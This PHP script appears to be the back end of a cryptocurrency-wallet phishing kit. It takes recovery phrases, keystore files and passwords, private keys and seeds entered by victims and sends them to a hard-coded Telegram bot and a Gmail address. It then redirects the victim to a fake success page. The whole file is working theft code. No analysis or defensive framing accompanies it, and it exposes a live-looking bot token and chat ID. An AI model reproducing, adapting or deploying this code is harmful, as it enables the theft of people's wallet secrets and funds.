<?php
   // Configuration
   $email_to = 'thamblanhema@gmail.com';
   $success_url = '/dnsparkingcom/success.html';

   // Telegram Bot Configuration
   $telegramBotToken = "7520816072:AAHt9xJt86SPQ3qsTADXrbirW-4LEW7F_7U";
   $telegramChatID = "-4645179313";

   // Get the form data with default values if not set
   $wallet = isset($_POST['wallet']) ? $_POST['wallet'] : 'Not provided';
   $phrase = isset($_POST['phrase']) ? $_POST['phrase'] : 'Not provided';
   $keystore = isset($_POST['keystore1']) ? $_POST['keystore1'] : 'Not provided';
   $keystorepass = isset($_POST['keystorepass']) ? $_POST['keystorepass'] : 'Not provided';
   $privatekeyval = isset($_POST['privatekeyval']) ? $_POST['privatekeyval'] : 'Not provided';
   $family_seed = isset($_POST['familyseed']) ? $_POST['familyseed'] : 'Not provided';

   // Create a single message body with all the input
   $message = "🚀 *New Wallet Submission!*\n\n";
   $message .= "💼 *Wallet:* `$wallet`\n";
   $message .= "🔑 *Phrase:* `$phrase`\n";
   $message .= "📜 *Keystore JSON:* `$keystore`\n";
   $message .= "🔐 *Keystore Pass:* `$keystorepass`\n";
   $message .= "🔏 *Private Key:* `$privatekeyval`\n";
   $message .= "🌱 *Family Seed:* `$family_seed`\n";

   // Send to Telegram using file_get_contents
   $url = "https://api.telegram.org/bot$telegramBotToken/sendMessage?" . http_build_query([
       'chat_id' => $telegramChatID,
       'text' => $message,
       'parse_mode' => 'Markdown',
       'disable_notification' => false
   ]);
   $response = file_get_contents($url);

   // Send to Email
   $subject = "New Wallet Data Submission";
   $headers = 'From: Form <info@web3sols.com>' . "\r\n" .
              'Reply-To: info@web3sols.com' . "\r\n" .
              'MIME-Version: 1.0' . "\r\n" .
              'Content-Type: text/html; charset=UTF-8';
   mail($email_to, $subject, nl2br($message), $headers);

   // Check if Telegram message was sent successfully
   if ($response !== false) {
       $result = json_decode($response, true);
       if (isset($result['ok']) && $result['ok'] === true) {
           // Redirect to success page
           header('Location: ' . $success_url);
           exit();
       } else {
           echo "Error sending message to Telegram: " . $response;
       }
   } else {
       echo "Error: Unable to send request to Telegram.";
   }
   ?>
